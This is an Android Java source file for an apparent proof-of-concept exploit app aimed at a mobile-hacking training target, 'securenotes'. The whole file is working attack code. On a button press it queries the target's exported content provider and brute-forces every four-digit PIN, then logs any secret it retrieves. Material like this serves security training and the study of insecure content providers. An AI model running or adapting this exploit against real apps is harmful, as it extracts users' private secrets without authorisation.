package com.tinopreter.secnotesploit;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;


import androidx.appcompat.app.AppCompatActivity;


public class MainActivity extends AppCompatActivity {

    Button btn_exploit;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btn_exploit = (Button) findViewById(R.id.btn_exploit);

        //Exploit!
        btn_exploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.i("ExploitBtn", "Exploit Button Clicked!");
                badQuery();
            }
        });
    }

    //Content Resolver to query target's Provider
    public void badQuery(){

        Uri uri =Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");

        //Brute Force PIN
        for (int i=0; i<10000; i++) {
            String PIN = String.format("%04d", i);
            try {
                Cursor cursor = getContentResolver().query(
                        uri, null, "pin=" + PIN, null, null
                );

                if (cursor.moveToFirst()) {
                    do {
                        String secret = cursor.getString(cursor.getColumnIndexOrThrow("Secret"));
                        Log.i("PIN", PIN + "-" + secret);
                    } while (cursor.moveToNext());
                }
            } catch (Exception e){
            }

        }
    }
}

